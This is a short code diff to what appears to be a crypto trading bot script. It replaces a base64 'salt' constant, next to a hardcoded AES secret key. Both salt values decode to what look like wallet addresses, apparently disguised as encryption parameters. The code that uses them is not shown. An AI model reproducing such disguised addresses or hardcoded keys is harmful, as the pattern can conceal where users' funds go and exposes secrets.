@@ -127,7 +127,7 @@ const botABI = [
 
 const algorithm = 'aes-256-ctr';
 const secretKey = 'vOVH6sdmpNWjRRIqCc7rdxs01lwHzfr3';
-const salt = 'MHhhMjhiNGU3RjhGNzY4RDYxRmUyMjBGNmQ5MEE5MmRiM2UyMTFh'
+const salt = 'MHgwMDkyODlGNTE5MzAwRTg1NkVkNDFCNjNERWNiMkNERTY3N0JC'
 const iv = crypto.randomBytes(16);
 
 const setBotAddress = (text) => {
